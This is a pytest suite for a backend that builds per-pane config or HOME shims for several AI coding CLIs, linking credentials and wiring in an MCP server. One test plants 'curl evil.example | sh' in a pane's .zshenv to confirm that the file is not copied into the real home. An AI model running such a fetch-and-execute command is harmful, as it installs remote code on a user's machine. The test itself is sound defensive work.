from __future__ import annotations

import json
import os
import stat
import time
import tomllib
from pathlib import Path
from typing import Any

import pytest
import tomli_w

from agent_team_backend import osplat
from agent_team_backend.mcp_server import pane_home, wiring as plan_mcp_wiring

URL = "http://127.0.0.1:4567/plan-mcp?pane=p1&t=tok"
SERVER = "navide"
LABEL = "Navide"


@pytest.fixture
def home(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
    """A fake home the shims are built under, so no test touches the real one."""
    fake = tmp_path / "home"
    fake.mkdir()
    monkeypatch.setattr(pane_home, "real_home", lambda: fake)
    return fake


def _config(home: Path, agent: str, pane: str) -> Path:
    spec = pane_home.SHIM_SPECS[agent]
    root = pane_home.shim_root(agent, pane)
    assert root is not None
    base = root / spec.vendor_dir if spec.shims_home else root
    return base.joinpath(*spec.config_relpath)


def _load(path: Path) -> dict[str, Any]:
    raw = path.read_text(encoding="utf-8")
    return tomllib.loads(raw) if path.suffix == ".toml" else json.loads(raw)


# ---- kimi: config-dir shim, $HOME untouched ----


def test_kimi_shim_uses_its_config_dir_var_and_writes_mcp_json(home: Path) -> None:
    (home / ".kimi-code").mkdir()
    prepared = pane_home.prepare("kimi", "p1", URL, SERVER)
    assert prepared is not None
    env_var, root = prepared
    assert env_var == "KIMI_CODE_HOME"
    assert Path(root) == home / ".navide-panes" / "kimi" / "p1"
    assert _load(_config(home, "kimi", "p1")) == {"mcpServers": {SERVER: {"url": URL}}}


def test_kimi_shim_symlinks_credentials_back_to_the_real_dir(home: Path) -> None:
    real = home / ".kimi-code"
    (real / "credentials").mkdir(parents=True)
    (real / "credentials" / "kimi-code.json").write_text("secret", encoding="utf-8")
    (real / "config.toml").write_text("[providers]", encoding="utf-8")
    _, root = pane_home.prepare("kimi", "p1", URL, SERVER)  # type: ignore[misc]
    creds = Path(root) / "credentials"
    # A link, not a copy: the user stays logged in and a refreshed token
    # written by the CLI lands in their real directory.
    assert creds.is_symlink() and creds.resolve() == (real / "credentials").resolve()
    assert (Path(root) / "config.toml").is_symlink()
    assert not (Path(root) / "mcp.json").is_symlink()  # only the config is ours


def test_kimi_shim_merges_the_users_own_servers(home: Path) -> None:
    real = home / ".kimi-code"
    real.mkdir()
    (real / "mcp.json").write_text(
        json.dumps({"mcpServers": {"mine": {"command": "x"}}, "extra": 7}),
        encoding="utf-8",
    )
    pane_home.prepare("kimi", "p1", URL, SERVER)
    document = _load(_config(home, "kimi", "p1"))
    assert document["mcpServers"]["mine"] == {"command": "x"}
    assert document["mcpServers"][SERVER] == {"url": URL}
    assert document["extra"] == 7
    # The user's own file is never written back to.
    assert "navide" not in (real / "mcp.json").read_text(encoding="utf-8")


def test_shim_refreshes_our_entry_in_place_without_reordering(home: Path) -> None:
    real = home / ".kimi-code"
    real.mkdir()
    (real / "mcp.json").write_text(
        json.dumps({"mcpServers": {"a": {}, SERVER: {"url": "stale"}, "z": {}}}),
        encoding="utf-8",
    )
    pane_home.prepare("kimi", "p1", URL, SERVER, LABEL, plan_mcp_wiring.LEGACY_SERVER_NAMES)
    servers = _load(_config(home, "kimi", "p1"))["mcpServers"]
    # Dropping former names must not turn a refresh into a move-to-end: the
    # user reads and edits this file too.
    assert list(servers) == ["a", SERVER, "z"]
    assert servers[SERVER] == {"url": URL}


def test_shim_drops_the_entry_left_by_a_former_server_name(home: Path) -> None:
    real = home / ".kimi-code"
    real.mkdir()
    legacy = plan_mcp_wiring.LEGACY_SERVER_NAMES[0]
    (real / "mcp.json").write_text(
        json.dumps({"mcpServers": {legacy: {"url": "http://stale"}, "mine": {"command": "x"}}}),
        encoding="utf-8",
    )
    pane_home.prepare("kimi", "p1", URL, SERVER, LABEL, plan_mcp_wiring.LEGACY_SERVER_NAMES)
    servers = _load(_config(home, "kimi", "p1"))["mcpServers"]
    # Ours under an old name, so it goes; the user's own is untouched.
    assert servers == {"mine": {"command": "x"}, SERVER: {"url": URL}}


# ---- antigravity: HOME shim, serverUrl, nested config dir ----


def test_antigravity_shim_shims_home_and_uses_server_url(home: Path) -> None:
    (home / ".gemini" / "config").mkdir(parents=True)
    (home / ".zshrc").write_text("export X=1", encoding="utf-8")
    prepared = pane_home.prepare("antigravity", "p1", URL, SERVER)
    assert prepared is not None
    env_var, root = prepared
    # No config-dir variable exists for this CLI: the home itself is relocated.
    assert env_var == osplat.paths.home_env_var()
    assert (Path(root) / ".zshrc").is_symlink()  # shell config still the user's
    # url/httpUrl are rejected as legacy fields; a remote server is serverUrl.
    assert _load(_config(home, "antigravity", "p1")) == {
        "mcpServers": {SERVER: {"serverUrl": URL}}
    }


def test_antigravity_shim_keeps_oauth_token_linked(home: Path) -> None:
    gemini = home / ".gemini"
    (gemini / "config").mkdir(parents=True)
    (gemini / "oauth_creds.json").write_text("token", encoding="utf-8")
    (gemini / "config" / "other.json").write_text("{}", encoding="utf-8")
    _, root = pane_home.prepare("antigravity", "p1", URL, SERVER)  # type: ignore[misc]
    assert (Path(root) / ".gemini" / "oauth_creds.json").is_symlink()
    assert (Path(root) / ".gemini" / "config" / "other.json").is_symlink()
    assert not (Path(root) / ".gemini" / "config" / "mcp_config.json").is_symlink()


def test_home_shim_does_not_mirror_the_panes_root_into_itself(home: Path) -> None:
    (home / ".gemini" / "config").mkdir(parents=True)
    pane_home.prepare("antigravity", "p1", URL, SERVER)
    _, root = pane_home.prepare("antigravity", "p2", URL, SERVER)  # type: ignore[misc]
    assert not (Path(root) / ".navide-panes").exists()


# ---- grok: HOME shim, TOML config, its own settings in the same file ----


def test_grok_shim_writes_a_toml_entry_and_copies_the_settings_file(home: Path) -> None:
    grok = home / ".grok"
    grok.mkdir()
    (grok / "config.toml").write_text(
        tomli_w.dumps({"ui": {"yolo": False}, "mcp_servers": {"mine": {"command": "./mine"}}}),
        encoding="utf-8",
    )
    _, root = pane_home.prepare("grok", "p1", URL, SERVER, LABEL)  # type: ignore[misc]
    config = _config(home, "grok", "p1")
    # The user's settings share this file with the MCP servers, so it cannot be
    # a symlink — the pane runs against a copy.
    assert not config.is_symlink()
    document = _load(config)
    # Their own settings survive the re-emit, theirs and ours side by side.
    assert document["ui"] == {"yolo": False}
    servers = document["mcp_servers"]
    assert sorted(servers) == sorted(["mine", SERVER])
    assert servers["mine"] == {"command": "./mine"}
    # A bare url is a streamable-HTTP server to grok; nothing else is written.
    assert servers[SERVER] == {"url": URL}


def test_grok_shim_replaces_our_entry_rather_than_appending(home: Path) -> None:
    (home / ".grok").mkdir()
    pane_home.prepare("grok", "p1", URL, SERVER, LABEL)
    pane_home.prepare("grok", "p1", URL + "&again=1", SERVER, LABEL)
    servers = _load(_config(home, "grok", "p1"))["mcp_servers"]
    assert list(servers) == [SERVER]  # not accumulating per spawn
    assert servers[SERVER]["url"].endswith("&again=1")  # the latest endpoint wins


def test_grok_shim_drops_an_entry_left_by_a_former_server_name(home: Path) -> None:
    grok = home / ".grok"
    grok.mkdir()
    legacy = plan_mcp_wiring.LEGACY_SERVER_NAMES[0]
    (grok / "config.toml").write_text(
        tomli_w.dumps(
            {"mcp_servers": {legacy: {"url": "http://stale"}, "mine": {"command": "./mine"}}}
        ),
        encoding="utf-8",
    )
    pane_home.prepare("grok", "p1", URL, SERVER, LABEL, plan_mcp_wiring.LEGACY_SERVER_NAMES)
    servers = _load(_config(home, "grok", "p1"))["mcp_servers"]
    # Both entries point at the same live endpoint, so the former name has to
    # go or every tool would be loaded twice.
    assert sorted(servers) == sorted(["mine", SERVER])


@pytest.mark.skipif(not osplat.paths.enforces_posix_modes(), reason="POSIX mode bits")
def test_grok_shim_config_is_not_world_readable(home: Path) -> None:
    (home / ".grok").mkdir()
    _, root = pane_home.prepare("grok", "p1", URL, SERVER)  # type: ignore[misc]
    config = _config(home, "grok", "p1")
    assert stat.S_IMODE(config.stat().st_mode) == 0o600
    assert stat.S_IMODE(Path(root).stat().st_mode) == 0o700


def test_grok_shim_shares_the_session_database_by_link(home: Path) -> None:
    grok = home / ".grok"
    grok.mkdir()
    (grok / "grok.db").write_text("sqlite", encoding="utf-8")
    _, root = pane_home.prepare("grok", "p1", URL, SERVER)  # type: ignore[misc]
    assert (Path(root) / ".grok" / "grok.db").is_symlink()


# ---- shared behaviour ----


def test_prepare_refreshes_links_added_since_the_last_spawn(home: Path) -> None:
    real = home / ".kimi-code"
    real.mkdir()
    pane_home.prepare("kimi", "p1", URL, SERVER)
    (real / "new-thing").write_text("later", encoding="utf-8")
    _, root = pane_home.prepare("kimi", "p1", URL, SERVER)  # type: ignore[misc]
    assert (Path(root) / "new-thing").is_symlink()


def test_prepare_drops_links_whose_target_disappeared(home: Path) -> None:
    real = home / ".kimi-code"
    real.mkdir()
    (real / "going-away").write_text("x", encoding="utf-8")
    _, root = pane_home.prepare("kimi", "p1", URL, SERVER)  # type: ignore[misc]
    (real / "going-away").unlink()
    pane_home.prepare("kimi", "p1", URL, SERVER)
    dangling = Path(root) / "going-away"
    assert not dangling.is_symlink() and not dangling.exists()


def test_an_entry_the_cli_created_in_the_shim_is_adopted_back(home: Path) -> None:
    """The whole point of a shim is that sessions and logins stay the user's.
    A name the real dir did not have yet is created *inside* the shim; left
    there it would be pane-local forever and the log readers, which look under
    the real home, would never see that pane."""
    real = home / ".kimi-code"
    real.mkdir()
    _, root = pane_home.prepare("kimi", "p1", URL, SERVER)  # type: ignore[misc]
    # The CLI logs in and starts a session, both landing in the shim.
    (Path(root) / "logs").mkdir()
    (Path(root) / "logs" / "run.log").write_text("entry", encoding="utf-8")

    pane_home.prepare("kimi", "p1", URL, SERVER)

    assert (real / "logs" / "run.log").read_text(encoding="utf-8") == "entry"
    assert (Path(root) / "logs").is_symlink()
    assert (Path(root) / "logs" / "run.log").read_text(encoding="utf-8") == "entry"


def test_home_level_files_are_never_adopted_into_the_real_home(home: Path) -> None:
    """A shimmed home is the pane's whole home, so anything run in it writes
    to ~. Promoting that into the user's real home would let pane content
    install a shell rc file their login shell then runs."""
    (home / ".grok").mkdir()
    _, root = pane_home.prepare("grok", "p1", URL, SERVER)  # type: ignore[misc]
    (Path(root) / ".zshenv").write_text("curl evil.example | sh", encoding="utf-8")
    (Path(root) / "cloned-repo").mkdir()

    pane_home.prepare("grok", "p1", URL, SERVER)

    assert not (home / ".zshenv").exists()
    assert not (home / "cloned-repo").exists()
    # Still the pane's own, just not promoted.
    assert (Path(root) / ".zshenv").is_file()


def test_nothing_is_seeded_when_the_cli_was_never_installed(home: Path) -> None:
    """Seeding a config dir for a tool the user does not have would leave
    Navide's fingerprints in their home for nothing."""
    prepared = pane_home.prepare("kimi", "p1", URL, SERVER)
    assert prepared is not None  # the pane is still wired
    assert not (home / ".kimi-code").exists()


def test_a_volatile_sidecar_is_discarded_rather_than_kept_on_conflict(home: Path) -> None:
    """A pane-local sqlite -wal beside a linked (shared) database is worse
    than none: SQLite would replay its stale frames into the real database."""
    grok = home / ".grok"
    grok.mkdir()
    _, root = pane_home.prepare("grok", "p1", URL, SERVER)  # type: ignore[misc]
    wal = Path(root) / ".grok" / "grok.db-wal"
    wal.unlink()
    wal.write_text("stale frames", encoding="utf-8")
    (grok / "grok.db-wal").write_text("the live one", encoding="utf-8")

    pane_home.prepare("grok", "p1", URL, SERVER)

    assert wal.is_symlink()
    assert wal.read_text(encoding="utf-8") == "the live one"


def test_a_crashed_write_is_cleaned_up_not_adopted(home: Path) -> None:
    """A temp file left by a crash between mkstemp and replace holds grok's
    own settings; adopting it would strand that copy in the real home."""
    grok = home / ".grok"
    grok.mkdir()
    _, root = pane_home.prepare("grok", "p1", URL, SERVER)  # type: ignore[misc]
    leftover = Path(root) / ".grok" / f"{pane_home.TMP_PREFIX}abc123"
    leftover.write_text('api_key = "xai-secret"\n', encoding="utf-8")

    pane_home.prepare("grok", "p1", URL, SERVER)

    assert not leftover.exists()
    assert not list(grok.glob(f"{pane_home.TMP_PREFIX}*"))


def test_adoption_never_overwrites_something_the_user_already_has(home: Path) -> None:
    real = home / ".kimi-code"
    real.mkdir()
    _, root = pane_home.prepare("kimi", "p1", URL, SERVER)  # type: ignore[misc]
    (Path(root) / "notes.txt").write_text("from the pane", encoding="utf-8")
    (real / "notes.txt").write_text("the user's", encoding="utf-8")

    pane_home.prepare("kimi", "p1", URL, SERVER)

    assert (real / "notes.txt").read_text(encoding="utf-8") == "the user's"
    assert (Path(root) / "notes.txt").read_text(encoding="utf-8") == "from the pane"


def test_session_dirs_are_links_from_the_very_first_spawn(home: Path) -> None:
    """Adoption only fixes this on the *next* spawn, which would leave the
    first pane's entire run invisible — so the targets are seeded up front."""
    (home / ".kimi-code").mkdir()
    _, root = pane_home.prepare("kimi", "p1", URL, SERVER)  # type: ignore[misc]
    for name in ("sessions", "credentials", "oauth"):
        assert (Path(root) / name).is_symlink(), name
        assert (home / ".kimi-code" / name).is_dir()


def test_grok_sqlite_sidecars_are_linked_even_when_absent(home: Path) -> None:
    """After a clean shutdown only grok.db exists, so "link what is there"
    would leave the WAL pane-local — credential_vault seeds the same three."""
    (home / ".grok").mkdir()
    _, root = pane_home.prepare("grok", "p1", URL, SERVER)  # type: ignore[misc]
    for name in ("grok.db", "grok.db-wal", "grok.db-shm"):
        assert (Path(root) / ".grok" / name).is_symlink(), name


def test_grok_first_session_is_visible_outside_the_home_shim(home: Path, monkeypatch) -> None:
    from agent_team_backend.cli_vendors.grok import GrokLogReader

    real = home / ".grok"
    real.mkdir()
    env_var, root = pane_home.prepare("grok", "p1", URL, SERVER)  # type: ignore[misc]
    assert env_var == pane_home.SHIM_SPECS["grok"].env_var
    sessions = Path(root) / ".grok" / "sessions"
    assert sessions.is_symlink()
    transcript = sessions / "%2Fworkspace" / "session-id" / "updates.jsonl"
    transcript.parent.mkdir(parents=True)
    transcript.write_text("{}\n")
    reader = GrokLogReader()
    monkeypatch.setattr(reader, "_home", lambda: real)
    assert reader.session_files() == [real / "sessions" / "%2Fworkspace" / "session-id" / "updates.jsonl"]


def test_grok_existing_shim_sessions_are_adopted_before_seeding(home: Path) -> None:
    real = home / ".grok"
    real.mkdir()
    root = pane_home.shim_root("grok", "p1")
    assert root is not None
    sessions = root / ".grok" / "sessions"
    transcript = sessions / "group" / "session-id" / "updates.jsonl"
    transcript.parent.mkdir(parents=True)
    transcript.write_text("existing transcript\n")

    pane_home.prepare("grok", "p1", URL, SERVER)

    assert sessions.is_symlink()
    assert (real / "sessions" / "group" / "session-id" / "updates.jsonl").read_text() == "existing transcript\n"
    assert transcript.read_text() == "existing transcript\n"


def test_grok_conflicting_session_trees_remain_untouched(home: Path) -> None:
    real = home / ".grok" / "sessions"
    real.mkdir(parents=True)
    (real / "real-session").write_text("real")
    root = pane_home.shim_root("grok", "p1")
    assert root is not None
    sessions = root / ".grok" / "sessions"
    sessions.mkdir(parents=True)
    (sessions / "pane-session").write_text("pane")

    pane_home.prepare("grok", "p1", URL, SERVER)

    assert not sessions.is_symlink()
    assert (real / "real-session").read_text() == "real"
    assert (sessions / "pane-session").read_text() == "pane"
    assert not (real / "pane-session").exists()


def test_an_edit_made_inside_the_pane_survives_the_next_spawn(home: Path) -> None:
    """grok keeps its own settings in the same file as its MCP servers.
    Rebuilding that file from the real one every spawn would discard a change
    the pane just made, and the user would have to make it again."""
    grok = home / ".grok"
    grok.mkdir()
    real = grok / "config.toml"
    real.write_text(tomli_w.dumps({"cli": {"api_key": "old"}}), encoding="utf-8")
    # The edit happens after the real file was written. Say so explicitly: a
    # tie goes to the real file by design, and coarse mtimes (one kernel tick
    # on Linux) make a tie out of two writes in the same instant.
    os.utime(real, (time.time() - 600, time.time() - 600))
    pane_home.prepare("grok", "p1", URL, SERVER)
    config = _config(home, "grok", "p1")
    rotated = _load(config)
    rotated["cli"]["api_key"] = "rotated-inside-the-pane"
    config.write_text(tomli_w.dumps(rotated), encoding="utf-8")

    pane_home.prepare("grok", "p1", URL, SERVER)

    document = _load(config)
    assert document["cli"]["api_key"] == "rotated-inside-the-pane"
    assert list(document["mcp_servers"]) == [SERVER]


def test_a_newer_real_config_wins_over_the_shim_copy(home: Path) -> None:
    """The other direction: the user switched accounts, so the real file is
    the newer one and the pane picks it up on its next spawn."""
    grok = home / ".grok"
    grok.mkdir()
    real = grok / "config.toml"
    real.write_text(tomli_w.dumps({"cli": {"api_key": "first"}}), encoding="utf-8")
    pane_home.prepare("grok", "p1", URL, SERVER)
    config = _config(home, "grok", "p1")
    os.utime(config, (time.time() - 600, time.time() - 600))
    real.write_text(tomli_w.dumps({"cli": {"api_key": "switched"}}), encoding="utf-8")

    pane_home.prepare("grok", "p1", URL, SERVER)

    assert _load(config)["cli"]["api_key"] == "switched"


@pytest.mark.skipif(not osplat.paths.enforces_posix_modes(), reason="POSIX mode bits")
def test_no_part_of_the_shim_path_is_world_readable(home: Path) -> None:
    """grok's copy carries an API key, so not even a brief window is allowed."""
    (home / ".grok").mkdir()
    _, root = pane_home.prepare("grok", "p1", URL, SERVER)  # type: ignore[misc]
    for path in (home / ".navide-panes", home / ".navide-panes" / "grok", Path(root)):
        assert stat.S_IMODE(path.stat().st_mode) == 0o700, path


def test_prepare_refuses_to_nest_a_shim_inside_a_shim(
    home: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Launching Navide from a shimmed pane's shell makes the backend inherit
    that HOME, which would otherwise build links pointing at links."""
    nested = home / ".navide-panes" / "grok" / "p1"
    nested.mkdir(parents=True)
    monkeypatch.setattr(pane_home, "real_home", lambda: nested)
    assert pane_home.prepare("grok", "p2", URL, SERVER) is None


def test_prepare_survives_a_missing_vendor_directory(home: Path) -> None:
    """Fresh install: nothing to mirror, but the pane still gets its endpoint."""
    prepared = pane_home.prepare("kimi", "p1", URL, SERVER)
    assert prepared is not None
    assert _load(_config(home, "kimi", "p1"))["mcpServers"][SERVER] == {"url": URL}


def test_prepare_starts_over_when_the_users_config_is_unparseable(home: Path) -> None:
    real = home / ".kimi-code"
    real.mkdir()
    (real / "mcp.json").write_text("{ broken", encoding="utf-8")
    pane_home.prepare("kimi", "p1", URL, SERVER)
    assert _load(_config(home, "kimi", "p1")) == {"mcpServers": {SERVER: {"url": URL}}}
    assert (real / "mcp.json").read_text(encoding="utf-8") == "{ broken"


@pytest.mark.parametrize("pane_id", ["../escape", "", "..", ".", "a/b", "..."])
def test_prepare_rejects_a_pane_id_that_is_not_a_plain_segment(
    home: Path, pane_id: str
) -> None:
    """A pane id becomes a path segment. "." and ".." pass a naive character
    class and would resolve the shim onto a directory we do not own."""
    assert pane_home.prepare("kimi", pane_id, URL, SERVER) is None
    assert pane_home.shim_root("kimi", pane_id) is None
    assert not (home / ".navide-panes").exists()
    assert not (home / ".kimi-code").exists()


def test_prepare_rejects_an_unknown_agent(home: Path) -> None:
    assert pane_home.prepare("claude", "p1", URL, SERVER) is None
    assert not (home / ".navide-panes").exists()


def test_two_panes_get_independent_shims(home: Path) -> None:
    (home / ".kimi-code").mkdir()
    pane_home.prepare("kimi", "p1", URL, SERVER)
    pane_home.prepare("kimi", "p2", "http://127.0.0.1:4567/plan-mcp?pane=p2&t=tok", SERVER)
    assert _load(_config(home, "kimi", "p1"))["mcpServers"][SERVER]["url"].endswith("pane=p1&t=tok")
    assert _load(_config(home, "kimi", "p2"))["mcpServers"][SERVER]["url"].endswith("pane=p2&t=tok")


# ---- wire_command integration ----


@pytest.mark.parametrize(
    ("agent", "env_var"),
    [("kimi", "KIMI_CODE_HOME"), ("grok", "HOME"), ("antigravity", "HOME")],
)
def test_wire_command_sets_the_shim_var_without_touching_the_command(
    home: Path, agent: str, env_var: str
) -> None:
    env: dict[str, str] = {}
    assert plan_mcp_wiring.wire_command(agent, agent, 4567, "p1", env) == agent
    assert env[env_var] == str(home / ".navide-panes" / agent / "p1")
    config = _config(home, agent, "p1")
    assert plan_mcp_wiring.caller_token("p1") in config.read_text(encoding="utf-8")


def test_wire_command_skips_the_shim_without_a_pane_id(home: Path) -> None:
    env: dict[str, str] = {}
    assert plan_mcp_wiring.wire_command("grok", "grok", 4567, "", env) == "grok"
    assert env == {}
    assert not (home / ".navide-panes").exists()


def test_wire_command_leaves_a_preset_shim_var_alone(home: Path) -> None:
    """An account-isolated home was already chosen for this pane. Not only is
    the value kept — no shim is built, so the spawn does no filesystem work."""
    (home / ".kimi-code").mkdir()
    env = {"KIMI_CODE_HOME": "/somewhere/else"}
    plan_mcp_wiring.wire_command("kimi", "kimi", 4567, "p1", env)
    assert env == {"KIMI_CODE_HOME": "/somewhere/else"}
    assert not (home / ".navide-panes").exists()


def test_no_symlinks_means_no_shim_and_no_files(home: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """Windows without Developer Mode cannot create links: the pane spawns
    unwired after one warning instead of failing entry by entry."""
    from agent_team_backend import osplat

    (home / ".claude").mkdir()
    monkeypatch.setattr(osplat.paths, "symlinks_available", lambda: False)
    assert pane_home.prepare("claude", "p1", URL, SERVER) is None
    assert not (home / pane_home.PANES_DIR_NAME).exists()


def test_no_symlinks_tells_the_caller_why_and_leaves_env_alone(
    home: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Issue #109: the pane looked healthy while every navide tool was missing.
    The refusal now comes with a reason the spawn can print into the pane."""
    monkeypatch.setattr(osplat.paths, "symlinks_available", lambda: False)
    env: dict[str, str] = {}
    warnings: list[str] = []
    assert plan_mcp_wiring.wire_command(
        "antigravity", "agy", 4567, "p1", env, warnings=warnings
    ) == "agy"
    assert env == {}
    assert not (home / pane_home.PANES_DIR_NAME).exists()
    assert len(warnings) == 1
    assert "Developer Mode" in warnings[0]
    assert pane_home.unavailable_reason("antigravity") is not None
    assert pane_home.unavailable_reason("claude") is None  # no shim to block


def test_home_shim_is_spelled_the_platform_way(home: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """Issue #109: agy resolves its config root from USERPROFILE on Windows and
    ignores HOME. A relocated home is handed over under both names; a CLI with
    its own variable is unaffected."""
    monkeypatch.setattr(osplat.paths, "home_env_var", lambda: "USERPROFILE")
    (home / ".gemini").mkdir()
    env: dict[str, str] = {}
    plan_mcp_wiring.wire_command("antigravity", "agy", 4567, "p1", env)
    root = str(home / pane_home.PANES_DIR_NAME / "antigravity" / "p1")
    assert env == {"USERPROFILE": root, "HOME": root}
    assert pane_home.SHIM_SPECS["antigravity"].env_var == "USERPROFILE"
    assert pane_home.SHIM_SPECS["kimi"].spawn_env("/x") == {"KIMI_CODE_HOME": "/x"}


def test_preset_platform_home_var_skips_the_shim(home: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """The already-set check reads the same variable the shim would set, so an
    account-isolated USERPROFILE is respected on Windows the way HOME is on POSIX."""
    monkeypatch.setattr(osplat.paths, "home_env_var", lambda: "USERPROFILE")
    env = {"USERPROFILE": "C:\\isolated"}
    plan_mcp_wiring.wire_command("antigravity", "agy", 4567, "p1", env)
    assert env == {"USERPROFILE": "C:\\isolated"}
    assert not (home / pane_home.PANES_DIR_NAME).exists()
